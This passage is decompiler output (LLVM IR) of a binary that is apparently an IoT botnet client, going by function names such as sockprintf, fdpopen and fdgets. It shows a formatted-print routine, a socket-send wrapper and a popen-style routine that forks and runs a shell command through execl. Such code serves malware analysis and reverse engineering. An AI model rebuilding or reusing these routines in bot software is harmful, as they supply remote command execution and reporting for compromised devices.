  br i1 %tmp61, label %dec_label_pc_8a40, label %dec_label_pc_8a30

dec_label_pc_8a30:                                ; preds = %dec_label_pc_8a20.preheader, %dec_label_pc_89e8
  %v4_8a2021 = phi i32 [ %v1_8a18, %dec_label_pc_89e8 ], [ %v4_8a2011, %dec_label_pc_8a20.preheader ]
  %stack_var_-32.120 = phi i8* [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ]
  %stack_var_-52.019 = phi i32 [ %v2_8a0c, %dec_label_pc_89e8 ], [ 0, %dec_label_pc_8a20.preheader ]
  %v2_8a34 = load i8, i8* %stack_var_-32.120, align 1
  %tmp62 = icmp ult i8 %v2_8a34, 58
  br i1 %tmp62, label %dec_label_pc_89e8, label %dec_label_pc_8a40

dec_label_pc_8a40:                                ; preds = %dec_label_pc_89e8, %dec_label_pc_8a30, %dec_label_pc_8a20.preheader
  %stack_var_-52.0.lcssa = phi i32 [ 0, %dec_label_pc_8a20.preheader ], [ %v2_8a0c, %dec_label_pc_89e8 ], [ %stack_var_-52.019, %dec_label_pc_8a30 ]
  %stack_var_-32.1.lcssa = phi i8* [ %stack_var_-32.0.lcssa, %dec_label_pc_8a20.preheader ], [ %v5_8a1c, %dec_label_pc_89e8 ], [ %stack_var_-32.120, %dec_label_pc_8a30 ]
  %v2_8a44 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8a48 = icmp eq i8 %v2_8a44, 115
  br i1 %v7_8a48, label %dec_label_pc_8a50, label %dec_label_pc_8ab4

dec_label_pc_8a50:                                ; preds = %dec_label_pc_8a40
  %v1_8a54 = add i32 %stack_var_-36.133, 4
  %v1_8a60 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8a60 = load i32, i32* %v1_8a60, align 4
  %v2_8a6c = icmp eq i32 %v2_8a60, 0
  br i1 %v2_8a6c, label %dec_label_pc_8a80, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_8a50
  %v5_8a78 = inttoptr i32 %v2_8a60 to i8*
  br label %dec_label_pc_8a88

dec_label_pc_8a80:                                ; preds = %dec_label_pc_8a50
  br label %dec_label_pc_8a88

dec_label_pc_8a88:                                ; preds = %dec_label_pc_8a74, %dec_label_pc_8a80
  %storemerge = phi i8* [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ea58.30, i32 0, i32 0), %dec_label_pc_8a80 ], [ %v5_8a78, %dec_label_pc_8a74 ]
  %v7_8a9c = call i32 @prints(i32 %tmp, i8* %storemerge, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 ptrtoint (i32* @0 to i32))
  %v2_8aa8 = add i32 %v7_8a9c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ab4:                                ; preds = %dec_label_pc_8a40
  %v2_8ab8 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8abc = icmp eq i8 %v2_8ab8, 100
  br i1 %v7_8abc, label %dec_label_pc_8ac4, label %dec_label_pc_8b18

dec_label_pc_8ac4:                                ; preds = %dec_label_pc_8ab4
  %v1_8ac8 = add i32 %stack_var_-36.133, 4
  %v1_8ad4 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8ad4 = load i32, i32* %v1_8ad4, align 4
  %v7_8b00 = call i32 @printi(i32 %tmp, i32 %v2_8ad4, i32 10, i32 1, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b0c = add i32 %v7_8b00, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b18:                                ; preds = %dec_label_pc_8ab4
  %v2_8b1c = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b20 = icmp eq i8 %v2_8b1c, 120
  br i1 %v7_8b20, label %dec_label_pc_8b28, label %dec_label_pc_8b7c

dec_label_pc_8b28:                                ; preds = %dec_label_pc_8b18
  %v1_8b2c = add i32 %stack_var_-36.133, 4
  %v1_8b38 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b38 = load i32, i32* %v1_8b38, align 4
  %v7_8b64 = call i32 @printi(i32 %tmp, i32 %v2_8b38, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8b70 = add i32 %v7_8b64, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8b7c:                                ; preds = %dec_label_pc_8b18
  %v2_8b80 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8b84 = icmp eq i8 %v2_8b80, 88
  br i1 %v7_8b84, label %dec_label_pc_8b8c, label %dec_label_pc_8be0

dec_label_pc_8b8c:                                ; preds = %dec_label_pc_8b7c
  %v1_8b90 = add i32 %stack_var_-36.133, 4
  %v1_8b9c = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8b9c = load i32, i32* %v1_8b9c, align 4
  %v7_8bc8 = call i32 @printi(i32 %tmp, i32 %v2_8b9c, i32 16, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 65)
  %v2_8bd4 = add i32 %v7_8bc8, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8be0:                                ; preds = %dec_label_pc_8b7c
  %v2_8be4 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8be8 = icmp eq i8 %v2_8be4, 117
  br i1 %v7_8be8, label %dec_label_pc_8bf0, label %dec_label_pc_8c44

dec_label_pc_8bf0:                                ; preds = %dec_label_pc_8be0
  %v1_8bf4 = add i32 %stack_var_-36.133, 4
  %v1_8c00 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c00 = load i32, i32* %v1_8c00, align 4
  %v7_8c2c = call i32 @printi(i32 %tmp, i32 %v2_8c00, i32 10, i32 0, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 97)
  %v2_8c38 = add i32 %v7_8c2c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8c44:                                ; preds = %dec_label_pc_8be0
  %v2_8c48 = load i8, i8* %stack_var_-32.1.lcssa, align 1
  %v7_8c4c = icmp eq i8 %v2_8c48, 99
  br i1 %v7_8c4c, label %dec_label_pc_8c54, label %dec_label_pc_8cc4

dec_label_pc_8c54:                                ; preds = %dec_label_pc_8c44
  %v1_8c58 = add i32 %stack_var_-36.133, 4
  %v1_8c64 = inttoptr i32 %stack_var_-36.133 to i32*
  %v2_8c64 = load i32, i32* %v1_8c64, align 4
  %v1_8c68 = urem i32 %v2_8c64, 256
  store i32 %v1_8c68, i32* %stack_var_-18, align 4
  %v6_8c8c = call i32 @prints(i32 %tmp, i8* %v5_8c8c, i32 %stack_var_-52.0.lcssa, i32 %stack_var_-48.0.lcssa, i32 %v1_8c58)
  %v2_8c98 = add i32 %v6_8c8c, %stack_var_-44.132
  br label %dec_label_pc_8cc4

dec_label_pc_8ca4:                                ; preds = %dec_label_pc_8948, %dec_label_pc_8984
  %stack_var_-32.2 = phi i8* [ %v5_8960, %dec_label_pc_8984 ], [ %stack_var_-32.435, %dec_label_pc_8948 ]
  %v2_8ca8 = load i8, i8* %stack_var_-32.2, align 1
  %v3_8ca8 = zext i8 %v2_8ca8 to i32
  %v3_8cb4 = call i32 @printchar(i32* %arg1, i32 %v3_8ca8)
  %v1_8cbc = add i32 %stack_var_-44.132, 1
  br label %dec_label_pc_8cc4

dec_label_pc_8cc4:                                ; preds = %dec_label_pc_8c44, %dec_label_pc_8c54, %dec_label_pc_8bf0, %dec_label_pc_8b8c, %dec_label_pc_8b28, %dec_label_pc_8a88, %dec_label_pc_8ac4, %dec_label_pc_8ca4
  %stack_var_-44.0 = phi i32 [ %v1_8cbc, %dec_label_pc_8ca4 ], [ %v2_8aa8, %dec_label_pc_8a88 ], [ %v2_8b0c, %dec_label_pc_8ac4 ], [ %v2_8b70, %dec_label_pc_8b28 ], [ %v2_8bd4, %dec_label_pc_8b8c ], [ %v2_8c38, %dec_label_pc_8bf0 ], [ %v2_8c98, %dec_label_pc_8c54 ], [ %stack_var_-44.132, %dec_label_pc_8c44 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.133, %dec_label_pc_8ca4 ], [ %v1_8a54, %dec_label_pc_8a88 ], [ %v1_8ac8, %dec_label_pc_8ac4 ], [ %v1_8b2c, %dec_label_pc_8b28 ], [ %v1_8b90, %dec_label_pc_8b8c ], [ %v1_8bf4, %dec_label_pc_8bf0 ], [ %v1_8c58, %dec_label_pc_8c54 ], [ %stack_var_-36.133, %dec_label_pc_8c44 ]
  %stack_var_-32.3 = phi i8* [ %stack_var_-32.2, %dec_label_pc_8ca4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8a88 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8ac4 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b28 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8b8c ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8bf0 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c54 ], [ %stack_var_-32.1.lcssa, %dec_label_pc_8c44 ]
  %v4_8cc4 = ptrtoint i8* %stack_var_-32.3 to i32
  %v1_8cc8 = add i32 %v4_8cc4, 1
  %stack_var_-32.4 = inttoptr i32 %v1_8cc8 to i8*
  %v2_8cd4 = load i8, i8* %stack_var_-32.4, align 1
  %v2_8cd8 = icmp eq i8 %v2_8cd4, 0
  br i1 %v2_8cd8, label %dec_label_pc_8ce0, label %dec_label_pc_8948

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8958, %dec_label_pc_8cc4, %entry
  %stack_var_-44.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-44.132, %dec_label_pc_8958 ], [ %stack_var_-44.0, %dec_label_pc_8cc4 ]
  %v2_8ce4 = icmp eq i32* %arg1, null
  br i1 %v2_8ce4, label %dec_label_pc_8cfc, label %dec_label_pc_8cec

dec_label_pc_8cec:                                ; preds = %dec_label_pc_8ce0
  %v2_8cf0 = load i32, i32* %arg1, align 4
  %v3_8cf8 = inttoptr i32 %v2_8cf0 to i8*
  store i8 0, i8* %v3_8cf8, align 1
  br label %dec_label_pc_8cfc

dec_label_pc_8cfc:                                ; preds = %dec_label_pc_8ce0, %dec_label_pc_8cec
  ret i32 %stack_var_-44.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_-32.4, { 1, 0 }
  uselistorder i8* %stack_var_-32.1.lcssa, { 12, 11, 9, 7, 5, 3, 1, 10, 8, 6, 4, 2, 0 }
  uselistorder i32 %stack_var_-52.0.lcssa, { 1, 2, 3, 4, 5, 0 }
  uselistorder i8* %stack_var_-32.0.lcssa, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-48.0.lcssa, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_89c0, { 1, 0 }
  uselistorder i32 %stack_var_-48.0.ph, { 1, 0 }
  uselistorder i8* %v5_8960, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_-44.132, { 0, 8, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %stack_var_-36.133, { 13, 0, 11, 12, 9, 10, 7, 8, 5, 6, 3, 4, 1, 2 }
  uselistorder i32 %stack_var_-32.4.in34, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-18, { 1, 0 }
  uselistorder i32 (i32*, i32)* @printchar, { 0, 4, 1, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @printi, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8cfc, { 1, 0 }
  uselistorder label %dec_label_pc_8ce0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8cc4, { 7, 1, 0, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_8ca4, { 1, 0 }
  uselistorder label %dec_label_pc_8a88, { 1, 0 }
  uselistorder label %dec_label_pc_8a40, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8a30, { 1, 0 }
  uselistorder label %dec_label_pc_89bc, { 1, 0 }
  uselistorder label %dec_label_pc_8948, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v6_8d18 = load i32, i32* @r1, align 4
  store i32 %v6_8d18, i32* %stack_var_-12, align 4
  %v3_8d1c = load i32, i32* @fp, align 4
  store i32 36132, i32* %stack_var_-20, align 4
  %v2_8d20 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8d20, i32* @fp, align 4
  %v4_8d2c = ptrtoint i32* %stack_var_-12 to i32
  %v4_8d40 = call i32 @print(i32* null, i32 %arg1, i32 %v4_8d2c)
  store i32 %v3_8d1c, i32* @fp, align 4
  ret i32 %v4_8d40

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v3_8d60 = load i32, i32* @fp, align 4
  store i32 36200, i32* %stack_var_-16, align 4
  %v2_8d64 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8d64, i32* @fp, align 4
  store i32 %arg1, i32* %stack_var_-44, align 4
  %v2_8d70 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8d88 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8d70)
  store i32 %v3_8d60, i32* @fp, align 4
  ret i32 %v4_8d88

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sockprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_8da4 = load i32, i32* @r2, align 4
  store i32 %v6_8da4, i32* %stack_var_-8, align 4
  %v3_8da8 = load i32, i32* @fp, align 4
  store i32 36272, i32* %stack_var_-16, align 4
  %v2_8dac = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_8dac, i32* @fp, align 4
  %v1_8dbc = call i32 @malloc(i32 2048)
  store i32 %v1_8dbc, i32* %stack_var_-44, align 4
  store i32 2048, i32* @r2, align 4
  %v2_8dd8 = inttoptr i32 %v1_8dbc to i8*
  %v3_8dd8 = call i32 @__GI_memset(i8* %v2_8dd8, i32 0)
  %v2_8de4 = ptrtoint i32* %stack_var_-8 to i32
  %v4_8e04 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8de4)
  %v3_8e0c = call i32 @strlen(i8* %v2_8dd8)
  %v2_8e1c = add i32 %v3_8e0c, %v1_8dbc
  %v3_8e24 = inttoptr i32 %v2_8e1c to i8*
  store i8 10, i8* %v3_8e24, align 1
  %v3_8e2c = call i32 @strlen(i8* %v2_8dd8)
  %v4_8e44 = call i32 @__libc_send(i32 %arg1, i32 %v1_8dbc, i32 %v3_8e2c, i32 16384)
  store i32 %v1_8dbc, i32* @r0, align 4
  %v0_8e54 = call i32 @free()
  store i32 %v3_8da8, i32* @fp, align 4
  ret i32 %v4_8e44

; uselistorder directives
  uselistorder i8* %v2_8dd8, { 1, 0, 2 }
  uselistorder i32 %v1_8dbc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e70 = load i32, i32* @fp, align 4
  store i32 36472, i32* %stack_var_-4, align 4
  %v2_8e74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e74, i32* @fp, align 4
  %v2_8e88 = load i8, i8* %arg2, align 1
  %v7_8e8c = icmp eq i8 %v2_8e88, 114
  br i1 %v7_8e8c, label %dec_label_pc_8ea4, label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %entry
  %v2_8e98 = load i8, i8* %arg2, align 1
  %v7_8e9c = icmp eq i8 %v2_8e98, 119
  br i1 %v7_8e9c, label %dec_label_pc_8ea4, label %dec_label_pc_8eb8

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8e94, %entry
  %v1_8ea8 = add i32 %tmp, 1
  %v1_8eac = inttoptr i32 %v1_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v2_8eb0 = icmp eq i8 %v2_8eac, 0
  br i1 %v2_8eb0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8ea4
  br label %dec_label_pc_90d0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8ea4
  %v2_8ec4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8ecc = call i32 @__GI_pipe(i32 %v2_8ec4)
  store i32 %v1_8ecc, i32* @r0, align 4
  %v1_8ed4 = icmp slt i32 %v1_8ecc, 0
  br i1 %v1_8ed4, label %dec_label_pc_8edc, label %dec_label_pc_8ee8

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec4
  br label %dec_label_pc_90d0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec4
  %v2_8eec = load i32, i32* @global_var_2e54c.32, align 4
  %v2_8ef0 = icmp eq i32 %v2_8eec, 0
  br i1 %v2_8ef0, label %dec_label_pc_8ef8, label %dec_label_pc_8f78

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ee8
  %v0_8ef8 = call i32 @getdtablesize()
  %v5_8f0c = icmp sgt i32 %v0_8ef8, 0
  br i1 %v5_8f0c, label %dec_label_pc_8f1c, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  br label %dec_label_pc_90d0

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ef8
  %v3_8f20 = mul i32 %v0_8ef8, 4
  %v1_8f28 = call i32 @malloc(i32 %v3_8f20)
  store i32 %v1_8f28, i32* @global_var_2e54c.32, align 4
  %v2_8f44 = icmp eq i32 %v1_8f28, 0
  br i1 %v2_8f44, label %dec_label_pc_8f4c, label %dec_label_pc_8f58

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f1c
  br label %dec_label_pc_90d0

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f1c
  store i32 %v3_8f20, i32* @r2, align 4
  %v2_8f74 = inttoptr i32 %v1_8f28 to i8*
  %v3_8f74 = call i32 @__GI_memset(i8* %v2_8f74, i32 0)
  store i32 %v3_8f74, i32* @r0, align 4
  br label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8ee8, %dec_label_pc_8f58
  %v0_8f78 = call i32 @__vfork()
  %v7_8f90 = icmp eq i32 %v0_8f78, -1
  br i1 %v7_8f90, label %dec_label_pc_8fa8, label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f78
  %v2_8f9c = icmp eq i32 %v0_8f78, 0
  br i1 %v2_8f9c, label %dec_label_pc_8fcc, label %dec_label_pc_906c

dec_label_pc_8fa8:                                ; preds = %dec_label_pc_8f78
  %v3_8fa8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fb0 = call i32 @__GI_close(i32 %v3_8fa8)
  %v1_8fbc = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90d0

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8f98
  %v3_8fd0 = load i8, i8* %arg2, align 1
  %v7_8fd4 = icmp eq i8 %v3_8fd0, 114
  br i1 %v7_8fd4, label %dec_label_pc_8fdc, label %dec_label_pc_9014

dec_label_pc_8fdc:                                ; preds = %dec_label_pc_8fcc
  %v7_8fe0 = icmp eq i32 %tmp3, 1
  br i1 %v7_8fe0, label %dec_label_pc_9004, label %dec_label_pc_8fe8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8fdc
  %v4_8ff4 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  %v1_9000 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9004

dec_label_pc_9004:                                ; preds = %dec_label_pc_8fdc, %dec_label_pc_8fe8
  %v3_9004 = load i32, i32* %stack_var_-32, align 4
  %v1_900c = call i32 @__GI_close(i32 %v3_9004)
  br label %dec_label_pc_9048

dec_label_pc_9014:                                ; preds = %dec_label_pc_8fcc
  %v3_9014 = load i32, i32* %stack_var_-32, align 4
  %v2_9018 = icmp eq i32 %v3_9014, 0
  br i1 %v2_9018, label %dec_label_pc_903c, label %dec_label_pc_9020

dec_label_pc_9020:                                ; preds = %dec_label_pc_9014
  %v4_902c = call i32 @dup2(i32 %v3_9014, i32 0, i32 %tmp)
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9038 = call i32 @__GI_close(i32 %v3_9030)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9014, %dec_label_pc_9020
  %v1_9044 = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_9048

dec_label_pc_9048:                                ; preds = %dec_label_pc_9004, %dec_label_pc_903c
  %v8_9060 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1ea60.34 to i32), i32 ptrtoint ([3 x i8]* @global_var_1e6a8.36 to i32), i32 ptrtoint ([3 x i8]* @global_var_1ea68.38 to i32), i32 %arg1, i32 0)
  %v1_9068 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_906c

dec_label_pc_906c:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_9048
  %v2_9070 = load i8, i8* %arg2, align 1
  %v7_9074 = icmp eq i8 %v2_9070, 114
  br i1 %v7_9074, label %dec_label_pc_907c, label %dec_label_pc_9094

dec_label_pc_907c:                                ; preds = %dec_label_pc_906c
  %v3_907c = load i32, i32* %stack_var_-32, align 4
  %v1_908c = call i32 @__GI_close(i32 %tmp3)
  br label %dec_label_pc_90a8

dec_label_pc_9094:                                ; preds = %dec_label_pc_906c
  %v3_909c = load i32, i32* %stack_var_-32, align 4
  %v1_90a4 = call i32 @__GI_close(i32 %v3_909c)
  br label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_907c, %dec_label_pc_9094
  %stack_var_-40.0 = phi i32 [ %v3_907c, %dec_label_pc_907c ], [ %tmp3, %dec_label_pc_9094 ]
  %v3_90ac = mul i32 %stack_var_-40.0, 4
  %v2_90b8 = load i32, i32* @global_var_2e54c.32, align 4
  %v2_90bc = add i32 %v2_90b8, %v3_90ac
  %v2_90c4 = inttoptr i32 %v2_90bc to i32*
  store i32 %v0_8f78, i32* %v2_90c4, align 4
  br label %dec_label_pc_90d0

dec_label_pc_90d0:                                ; preds = %dec_label_pc_8fa8, %dec_label_pc_8f4c, %dec_label_pc_8f10, %dec_label_pc_8edc, %dec_label_pc_8eb8, %dec_label_pc_90a8
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8edc ], [ -1, %dec_label_pc_8f4c ], [ -1, %dec_label_pc_8fa8 ], [ %stack_var_-40.0, %dec_label_pc_90a8 ], [ -1, %dec_label_pc_8f10 ], [ -1, %dec_label_pc_8eb8 ]
  store i32 %v3_8e70, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f78, { 1, 2, 0 }
  uselistorder i32 %v3_8f20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_90d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90a8, { 1, 0 }
  uselistorder label %dec_label_pc_906c, { 1, 0 }
  uselistorder label %dec_label_pc_9048, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
  uselistorder label %dec_label_pc_9004, { 1, 0 }
  uselistorder label %dec_label_pc_8f78, { 1, 0 }
  uselistorder label %dec_label_pc_8eb8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_910c = load i32, i32* @global_var_2e54c.32, align 4
  %v2_9110 = icmp eq i32 %v2_910c, 0
  br i1 %v2_9110, label %dec_label_pc_9264, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %entry
  %v3_911c = mul i32 %arg1, 4
  %v2_912c = add i32 %v2_910c, %v3_911c
  %v1_9130 = inttoptr i32 %v2_912c to i32*
  %v2_9130 = load i32, i32* %v1_9130, align 4
  %v2_9134 = icmp eq i32 %v2_9130, 0
  br i1 %v2_9134, label %dec_label_pc_9264, label %dec_label_pc_9148

dec_label_pc_9148:                                ; preds = %dec_label_pc_9118
  %v1_914c = call i32 @__GI_close(i32 %arg1)
  %v2_9150 = ptrtoint i32* %stack_var_-36 to i32
  %v2_9158 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9168 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 2)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9178 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 3)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9188 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 1)
  %v2_9190 = ptrtoint i32* %stack_var_-28 to i32
  %v4_919c = call i32 @__GI_sigprocmask(i32 0, i32 %v2_9150, i32 %v2_9190, i32 %v2_9150)
  %v2_91bc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_9148
  %v2_91b0 = load i32, i32* @global_var_2e54c.32, align 4
  %v2_91b4 = add i32 %v2_91b0, %v3_911c
  %v1_91b8 = inttoptr i32 %v2_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  store i32 %v2_91bc, i32* @r1, align 4
  %v3_91cc = call i32 @__libc_waitpid(i32 %v2_91b8, i32 %v2_91bc, i32 0)
  %v3_91dc = icmp eq i32 %v3_91cc, -1
  %v8_91dc = icmp eq i32 %v3_91cc, -1
  br i1 %v3_91dc, label %dec_label_pc_91e4, label %dec_label_pc_91f8

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91a0
  %v0_91e4 = call i32 @__GI___errno_location()
  %v1_91ec = inttoptr i32 %v0_91e4 to i32*
  %v2_91ec = load i32, i32* %v1_91ec, align 4
  %v7_91f0 = icmp eq i32 %v2_91ec, 4
  br i1 %v7_91f0, label %dec_label_pc_91a0, label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_91a0, %dec_label_pc_91e4
  %v4_9208 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_9190, i32 0, i32 %v2_9190)
  %v3_9210 = mul i32 %tmp6, 4
  %v2_921c = load i32, i32* @global_var_2e54c.32, align 4
  %v2_9220 = add i32 %v2_921c, %v3_9210
  %v2_9228 = inttoptr i32 %v2_9220 to i32*
  store i32 0, i32* %v2_9228, align 4
  br i1 %v8_91dc, label %dec_label_pc_9264, label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_91f8
  %v3_9238 = load i32, i32* %stack_var_-40, align 4
  %v1_9244 = and i32 %v3_9238, 65280
  %v3_92481 = udiv i32 %v1_9244, 256
  br label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_9238, %dec_label_pc_91f8, %entry, %dec_label_pc_9118
  %storemerge = phi i32 [ -1, %dec_label_pc_9118 ], [ -1, %entry ], [ %v3_92481, %dec_label_pc_9238 ], [ -1, %dec_label_pc_91f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_91bc, { 1, 0 }
  uselistorder i32 %v2_9190, { 1, 0, 2 }
  uselistorder i32 %v2_9150, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_911c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2e54c.32, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9264, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91f8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  br label %dec_label_pc_92ec

dec_label_pc_92ac:                                ; preds = %dec_label_pc_92fc
  store i32 %v2_9308, i32* @r1, align 4
  %v1_92c8 = call i32 @__GI_read(i32 %arg3)
  %v1_92d8 = add nuw i32 %storemerge25, 1
